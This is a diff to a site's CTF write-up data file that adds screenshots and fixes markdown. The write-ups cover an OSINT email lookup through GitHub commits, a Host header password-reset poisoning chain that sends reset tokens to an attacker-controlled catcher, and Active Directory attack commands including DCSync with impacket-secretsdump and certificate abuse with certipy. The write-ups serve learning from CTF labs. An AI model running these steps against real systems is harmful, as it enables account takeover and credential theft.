@@ -23,13 +23,19 @@ export const writeups: Writeup[] = [
 **Author:** Anlen Jeban  
 **Date:** August 31, 2026
 
+![Title](/writeups/writeup-1-1.png)
+
 ---
 
 ## Task 1: Inadvertent Exposure (OSINT)
 
 ### The Challenge
 
-We were given a single screenshot of a Kali Linux terminal session showing an ongoing reconnaissance operation. The terminal revealed:
+We were given a single screenshot of a Kali Linux terminal session showing an ongoing reconnaissance operation.
+
+![Kali Linux Terminal](/writeups/writeup-2-2.jpeg)
+
+The terminal revealed:
 
 - **Tool:** HackThis v1.2
 - **Target:** internal-service.local (192.168.1.10)
@@ -64,6 +70,8 @@ I accessed the GitHub API endpoint for the repository's commits:
 https://api.github.com/repos/joshuaclark02/Custom-Scripts/commits
 \`\`\`
 
+![GitHub API Response](/writeups/writeup-3-3.png)
+
 Scanning through the raw JSON data, I found the target's email address exposed in the \`commit.author.email\` field.
 
 ### The Flag
@@ -80,17 +88,25 @@ CloudSEK{joshua.clark02@proton.me}
 
 We were presented with the StrikeVigil portal — a web application with several security misconfigurations that needed to be chained together for a full account takeover.
 
+![StrikeVigil Portal](/writeups/writeup-4-4.png)
+
 ### Reconnaissance
 
 During initial reconnaissance, I accessed the login page and examined the HTML source code. The developer had left comments in the source referencing internal JavaScript file paths, including a debug module.
+
+![HTML Source Code](/writeups/writeup-5-5.png)
 
 Examining the referenced JavaScript files revealed two critical issues:
 
 **Finding 1: Hardcoded Credentials in app.js**
 
+![app.js Hardcoded Credentials](/writeups/writeup-5-6.png)
+
 The \`app.js\` file contained a hardcoded admin email address (\`admin@strikevigil.com\`) along with a TODO comment indicating the credential was seeded on first run.
 
 **Finding 2: Exposed Debug Endpoint in debug.js**
+
+![debug.js Base64 URL](/writeups/writeup-6-7.png)
 
 The \`debug.js\` file contained a base64-encoded URL pointing to an internal request logging service running on port 8080.
 
@@ -99,6 +115,8 @@ The \`debug.js\` file contained a base64-encoded URL pointing to an internal req
 **Phase 1: Decoding the Debug URL**
 
 After decoding the base64 string from \`debug.js\`, the URL resolved to:
+
+![Base64 Decoding](/writeups/writeup-6-8.png)
 
 \`\`\`
 http://15.206.47.5:8080/logs
@@ -110,6 +128,8 @@ This pointed to an internal request catcher service that was unintentionally exp
 
 I analyzed the forgot-password functionality and identified that the application was constructing the reset link using the \`Host\` header from the incoming request. This is a classic Host header injection vulnerability.
 
+![Password Reset Poisoning](/writeups/writeup-7-9.png)
+
 I sent a POST request to \`/forgot-password\` with a manipulated Host header:
 
 \`\`\`
@@ -119,9 +139,13 @@ Host: 15.206.47.5:8080/attackerref
 
 The application accepted this and generated a reset link using the injected domain. The response headers confirmed this with \`X-Debug-Reset-Domain\` showing the attacker-controlled host.
 
+![Response Headers](/writeups/writeup-7-10.png)
+
 **Phase 3: Token Capture**
 
 The application itself made a request to the Request Catcher with the password reset token embedded in the URL path. Within seconds, the token appeared in the public logs at \`/logs\`.
+
+![Request Catcher Logs](/writeups/writeup-8-11.jpeg)
 
 I extracted the token value and reference ID from the logged request.
 
@@ -134,6 +158,9 @@ http://15.206.47.5:9090/reset-password?token=<CAPTURED_TOKEN>&ref=<REF_ID>
 \`\`\`
 
 Upon accessing this endpoint, the application validated the token and rendered a password reset form containing:
+
+![Password Reset Form](/writeups/writeup-9-12.png)
+
 - A hidden token field
 - A new password input field
 - Title: "Set new password"
@@ -151,6 +178,8 @@ I entered a new strong password and submitted the form. The application:
 After submitting the login credentials, the application verified the email and password combination against its user database. Upon successful validation:
 - The server issued a new session cookie with administrative privileges
 - The browser was redirected to \`/dashboard\` via a 302 response
+
+![Admin Dashboard](/writeups/writeup-10-13.png)
 
 The admin dashboard loaded successfully, and the CTF flag was displayed in a highlighted section.
 
@@ -202,7 +231,7 @@ Started with anonymous LDAP enumeration to gather domain information:
 
 \`\`\`bash
 ldapsearch -x -H dc.telecom.local -b "DC=telecom,DC=local" -s sub "(objectClass=*)" dn
-\`\`\>
+\`\`\`
 
 This revealed the domain structure, user accounts, and group memberships.
 
@@ -272,7 +301,7 @@ Escalated to SYSTEM using GodPotato:
 
 \`\`\`bash
 GodPotato.exe -cmd "cmd /c whoami"
-\`\`\>
+\`\`\`
 
 ### DCSync
 
@@ -280,7 +309,7 @@ Extracted password hashes from Domain Controller:
 
 \`\`\`bash
 impacket-secretsdump telecom.local/admin:password@dc.telecom.local
-\`\`\>
+\`\`\`
 
 ---
 
@@ -292,7 +321,7 @@ Abused misconfigured Certificate Authority:
 
 \`\`\`bash
 certipy find -u user@telecom.local -p password -dc-ip dc.telecom.local -ca telecom-CA
-\`\`\>
+\`\`\`
 
 ### Certificate Request
 
@@ -300,7 +329,7 @@ Requested certificate as Domain Admin:
 
 \`\`\`bash
 certipy req -u user@telecom.local -p password -ca telecom-CA -template Administrator -upn admin@telecom.local
-\`\`\>
+\`\`\`
 
 ### PKINIT Authentication
 
@@ -403,7 +432,7 @@ Found a login page at \`/admin/\`. Used default credentials:
 
 \`\`\`
 Email: admin@oopsie.htb
-Password:Meggie1
+Password: Meggie1
 \`\`\`
 
 ---
